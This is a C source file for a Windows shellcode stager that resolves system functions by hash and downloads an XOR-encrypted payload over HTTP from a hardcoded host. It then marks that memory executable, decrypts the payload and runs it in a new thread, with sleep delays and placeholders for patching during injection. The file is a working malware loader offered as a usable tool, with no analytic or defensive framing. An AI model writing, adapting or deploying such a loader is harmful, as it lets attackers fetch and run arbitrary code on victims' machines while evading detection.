#include "APIResolve.h"

// Code-Options to include / compile (comment out to turn something off)
#define CREATE_NEW_THREAD          // Create a new thread (download, encryption and execution of payload) and return to caller asap
// #define SET_BREAKPOINTS         // Use softwarebreakpoints on the start and end of the shellcode
#define DOWNLOAD_PAYLOAD           // Download the payload instead providing a given address and lenght in PayloadAddress / PayloadLenght
// #define USE_DLL_STOMPING        // Use the DLL stomping method to execute the payload (not implemented yet)

// Parameter in memory to provide the decryption key
void PayloadDecryptionKey()
{
    asm(".byte 0x01, 0x02, 0x03, 0x04");
}

#ifdef DOWNLOAD_PAYLOAD

// Parameter in memory to provide the http hostname to the payload 
void PayloadHostname()
{
    asm(".byte '1', '9', '2', '.', '1', '6', '8','.', '2', '4', '7', '.', '1', '3', '1', 0x00");
}

// Parameter in memory to provide the http port to the payload 
void PayloadPort()
{
    asm(".long 80");
}

// Parameter in memory to provide the http filename to the payload
void PayloadFilename()
{
    asm(".byte 'E', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', 'P', 'a', 'y', 'l', 'o', 'a', 'd', '.', 'b', 'i', 'n', 0x00");
}

#else

// Parameter in memory to provide the address to the payload (overwrite this by searching this placeholder during injection)
void PayloadAddress()
{
    asm(".byte 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88");
}

// Parameter in memory to provide the lenght of the payload (overwrite this by searching this placeholder during injection)
void PayloadLenght()
{
    asm(".byte 0xDE, 0xAD, 0x10, 0xAF");
}

#endif

// Without this function(S) defined, we'll get  undefined reference to `___chkstk_ms' errors when compiling, so we just overwrite it.
void ___chkstk_ms()
{
    return;
}

// Also got compiler errors for missing strlen (although it's actually not used, so a dummy function here)
SIZE_T strlen(const char* _Str)
{
    return 0;
}

// We need a function, that manually does the same than strlen() does as we cannnot use that here
int __attribute__((noinline)) my_strlen(char* str)
{
	int i = 0;
	while (str[i] != '\0') {
		i++;
	}
	return i;
}

VOID __attribute__((noinline))my_memcpy(void* dest, void* src, size_t n)
{
    char* csrc = (char*)src;
    char* cdest = (char*)dest;

    for (int i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
};

// Function to decrypt the payload with a key
void xor32(LPVOID buf, DWORD bufSize)
{
    uint32_t* buf32 = (uint32_t*)buf;
    // xorKey is the value of LongKey() function, which is a char array. We need to convert it to uint32_t
    uint32_t xorKey = *(uint32_t*)PayloadDecryptionKey;

    uint8_t* buf8 = (uint8_t*)buf;

    size_t bufSizeRounded = (bufSize - (bufSize % sizeof(uint32_t))) / sizeof(uint32_t);
    for (size_t i = 0; i < bufSizeRounded; i++)
    {
        ((uint32_t*)buf8)[i] ^= xorKey;
    }

    for (size_t i = sizeof(uint32_t) * bufSizeRounded; i < bufSize; i++)
    {
        size_t x = i % (sizeof(uint32_t) * bufSizeRounded);
        buf8[i] ^= (uint8_t)((xorKey >> (8 * x)) & 0xFF);
    }
}

#ifdef DOWNLOAD_PAYLOAD
//TODO: Add comments to this method
void DownloadDecryptExecutePayload() {
#ifdef SET_BREAKPOINTS
    asm(".byte 0xCC, 0xCC, 0xCC");
#endif
    uint64_t _InternetCloseHandle = getFunctionPtr(HASH_WININET, HASH_INTERNETCLOSEHANDLE);
    uint64_t _InternetOpenA = getFunctionPtr(HASH_WININET, HASH_INTERNETOPENA);
	uint64_t _InternetConnectA = getFunctionPtr(HASH_WININET, HASH_INTERNETCONNECTA);
	uint64_t _HttpOpenRequestA = getFunctionPtr(HASH_WININET, HASH_HTTPOPENREQUESTA);
	uint64_t _InternetReadFile = getFunctionPtr(HASH_WININET, HASH_INTERNETREADFILE);
	uint64_t _HttpSendRequestA = getFunctionPtr(HASH_WININET, HASH_HTTPSENDREQUESTA);
    uint64_t _VirtualAlloc = getFunctionPtr(HASH_KERNEL32, HASH_VIRTUALALLOC);

    char* hostname = (char*) &PayloadHostname;
    LPCTSTR endpoint = (LPCTSTR) &PayloadFilename;
    uint32_t port = *( (uint32_t*)PayloadPort);

	HINTERNET h_session = NULL, h_connect = NULL, h_request = NULL;
	DWORD dw_read = 0, dw_read_total = 0, dw_success = 0;
	char method[] = { 'G', 'E', 'T', 0x00 };

	SIZE_T mem_size = 1024*1024;  // Max Size of Payload!!! 1MB
    LPVOID ptr_memory = ((VIRTUALALLOC)_VirtualAlloc)(0, mem_size, MEM_COMMIT, PAGE_READWRITE);

	h_session = ((INTERNETOPENA)_InternetOpenA)(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!h_session) {goto cleanup;}


	h_connect = ((INTERNETCONNECTA)_InternetConnectA)(h_session, hostname, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	if (!h_session) {goto cleanup;}

	h_request = ((HTTPOPENREQUESTA)_HttpOpenRequestA)(h_connect, (LPCTSTR)&method, endpoint, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 1);
	if (!h_session) {goto cleanup;}

	if (((HTTPSENDREQUESTA)_HttpSendRequestA)(h_request, NULL, 0, NULL, 0) == 0) {goto cleanup;}

    do {
		if (((INTERNETREADFILE)_InternetReadFile)(h_request, (LPVOID)((uint64_t)ptr_memory + dw_read_total), mem_size - dw_read_total, &dw_read) == 0)
			break;

		dw_read_total += dw_read;
	} while (dw_read);

    if (dw_read_total>0) {
        DecryptExecutePayload(ptr_memory, dw_read_total);
    }

    cleanup:
	((INTERNETCLOSEHANDLE)_InternetCloseHandle)(h_session);
	((INTERNETCLOSEHANDLE)_InternetCloseHandle)(h_connect);
	((INTERNETCLOSEHANDLE)_InternetCloseHandle)(h_request);
}
#endif

void DecryptExecutePayload(LPVOID payload, DWORD len) {
#ifdef SET_BREAKPOINTS
     asm(".byte 0xCC, 0xCC, 0xCC");
#endif
    uint64_t _Sleep = getFunctionPtr(HASH_KERNEL32, HASH_SLEEP);
    // Wait 2 seconds before decrypting and execution of payload
    ((SLEEP)_Sleep)(2000);
    // Update protection of payload to PAGE_READWRITE
    DWORD oldProtect;
    uint64_t _VirtualProtect = getFunctionPtr(HASH_KERNEL32, HASH_VIRTUALPROTECT);
    ((VIRTUALPROTECT)_VirtualProtect)(payload, len, PAGE_EXECUTE_READWRITE, &oldProtect);
    // Wait 3 seconds before decrypting and execution of payload
    ((SLEEP)_Sleep)(3000);
    // Decrypt payload
    xor32(payload, len);
    // Update protection of payload to EXECUTE_READ
    ((VIRTUALPROTECT)_VirtualProtect)(payload, len, PAGE_EXECUTE_READ, &oldProtect);
    // Execute payload
    ((void (*)())payload)();
}

DWORD WINAPI Thread(LPVOID lpParam)
{
#ifdef SET_BREAKPOINTS
    asm(".byte 0xCC, 0xCC, 0xCC");
#endif

#ifdef DOWNLOAD_PAYLOAD
    // Download payload and execute it
    DownloadDecryptExecutePayload();
#else
    // Only execute payload (provide PayloadAddress & PayloadLenght during injection)
    DWORD len = *( (DWORD*)PayloadLenght);
    LPVOID** pointerpointer = &PayloadAddress;
    LPVOID* payload = *pointerpointer;
    DecryptExecutePayload(payload,len);
#endif
}

void Main()
{
#ifdef SET_BREAKPOINTS
     asm(".byte 0xCC, 0xCC, 0xCC");
#endif

#ifdef CREATE_NEW_THREAD
    // Define CreateThread function
    uint64_t _CreateThread = getFunctionPtr(HASH_KERNEL32, HASH_CREATETHREAD);
    CREATE_THREAD pCreateThread = (CREATE_THREAD)_CreateThread;

    // Variables for thread creation
    DWORD threadId;

    // Create thread pointing to function Thread(NULL)
    pCreateThread(
        NULL,                  // Default security attributes
        0,                     // Default stack size
        Thread,                // Function to run
        NULL,                  // Parameter to thread function
        0,                     // Run immediately
        &threadId              // Thread ID
    );
#else
    Thread(NULL);
#endif
}